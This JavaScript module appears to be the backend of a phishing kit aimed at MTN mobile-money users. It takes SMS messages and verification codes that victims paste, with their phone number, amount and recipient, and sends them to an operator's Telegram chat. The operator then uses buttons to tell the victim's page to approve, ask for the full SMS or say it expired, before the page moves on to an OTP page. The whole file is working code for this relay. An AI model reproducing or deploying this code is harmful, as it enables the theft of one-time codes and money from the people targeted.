// telegram-mtn.js
const crypto = require('crypto');

/**
 * MTN SMS approval flow with 3 buttons:
 *   approve   → client proceeds to otp.html
 *   paste_full → client shows "paste full SMS" notice
 *   expired   → client shows "SMS expired, resend" notice
 *
 * ENV (Render):
 *   TELEGRAM_BOT_TOKEN
 *   TELEGRAM_CHAT_ID
 */

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '';

// txRef -> { decision, messageId, smsText, createdAt }
const pending = new Map();

function log(m) { console.log('[tg-mtn]', m); }

async function sendTelegramMessage(text, keyboard) {
  if (!BOT_TOKEN || !CHAT_ID) throw new Error('Telegram not configured.');
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  const body = {
    chat_id: CHAT_ID,
    text,
    parse_mode: 'HTML',
    disable_web_page_preview: true,
    reply_markup: keyboard ? { inline_keyboard: keyboard } : undefined
  };
  const res = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body)
  });
  const data = await res.json();
  if (!data.ok) throw new Error('Telegram send failed: ' + (data.description || 'unknown'));
  return data.result;
}

async function answerCallback(callbackQueryId, text) {
  if (!BOT_TOKEN) return;
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`;
  await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ callback_query_id: callbackQueryId, text, show_alert: false })
  }).catch(() => {});
}

async function editReplyMarkup(messageId) {
  if (!BOT_TOKEN || !CHAT_ID) return;
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`;
  await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID, message_id: messageId,
      reply_markup: { inline_keyboard: [] }
    })
  }).catch(() => {});
}

/* Handle button clicks coming from Telegram */
async function handleUpdate(update) {
  if (!update || !update.callback_query) return;
  const cq = update.callback_query;
  const data = cq.data || '';               // "approve:<ref>" etc.
  const messageId = cq.message && cq.message.message_id;

  const [action, txRef] = data.split(':');
  if (!txRef) { await answerCallback(cq.id, 'Invalid request'); return; }

  const entry = pending.get(txRef);
  if (!entry) { await answerCallback(cq.id, 'Request already handled.'); return; }
  if (entry.decision !== 'pending') { await answerCallback(cq.id, 'Already ' + entry.decision + '.'); return; }

  if (action === 'approve') {
    entry.decision = 'approved';
    await answerCallback(cq.id, '✅ Approved — client proceeds.');
  } else if (action === 'paste_full') {
    entry.decision = 'paste_full';
    await answerCallback(cq.id, '⚠ Client told to paste the full SMS.');
  } else if (action === 'expired') {
    entry.decision = 'expired';
    await answerCallback(cq.id, '⏱ Client told SMS expired — resend.');
  } else {
    await answerCallback(cq.id, 'Unknown action.');
    return;
  }
  log(`tx ${txRef} → ${entry.decision}`);
  if (messageId) await editReplyMarkup(messageId);
}

function registerRoutes(app) {
  /* Client sends the exact pasted SMS here */
  app.post('/api/verification/sms', async (req, res) => {
    try {
      const { tx, code, message, am, cur, c, an, rn } = req.body || {};
      if (!tx || !message) return res.status(400).json({ error: 'Missing tx or message' });

      // Store / refresh pending
      const existing = pending.get(tx);
      if (existing && existing.decision === 'pending') {
        // Already pending — just ack
        return res.json({ ok: true, requestId: tx });
      }

      pending.set(tx, { decision: 'pending', messageId: null, smsText: message, createdAt: Date.now() });

      const safe = (v) => String(v == null ? '—' : v)
        .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');

      const text =
        `<b>📨 New MTN Y'ello SMS submitted</b>\n\n` +
        `<b>Reference:</b> <code>${safe(tx)}</code>\n` +
        `<b>Amount:</b> ${safe(cur)} ${safe(am)}\n` +
        `<b>Country:</b> ${safe(c)}\n` +
        `<b>Number:</b> ${safe(an)}\n` +
        `<b>Recipient:</b> ${safe(rn)}\n` +
        `<b>Detected code:</b> <code>${safe(code)}</code>\n\n` +
        `<b>Pasted SMS:</b>\n<pre>${safe(message)}</pre>`;

      const keyboard = [[
        { text: '✅ Approve',            callback_data: `approve:${tx}` },
        { text: '⚠️ Paste full SMS',     callback_data: `paste_full:${tx}` },
        { text: '⏱ SMS expired',         callback_data: `expired:${tx}` }
      ]];

      const sent = await sendTelegramMessage(text, keyboard);
      const e = pending.get(tx);
      if (e) e.messageId = sent.message_id;

      res.json({ ok: true, requestId: tx });
    } catch (err) {
      console.error('[tg-mtn] send error', err);
      res.status(500).json({ error: 'Telegram send failed' });
    }
  });

  /* Client polls decision here */
  app.get('/api/verification/sms-status/:ref', (req, res) => {
    const entry = pending.get(req.params.ref);
    if (!entry) return res.json({ decision: 'pending' });
    res.json({ decision: entry.decision });
  });

  /* Telegram webhook */
  app.post('/api/telegram/mtn-webhook', async (req, res) => {
    try { await handleUpdate(req.body); }
    catch (e) { console.error('[tg-mtn] webhook err', e); }
    res.sendStatus(200);
  });

  log('Routes registered: /api/verification/sms, /api/verification/sms-status/:ref, /api/telegram/mtn-webhook');
}

module.exports = { registerRoutes };
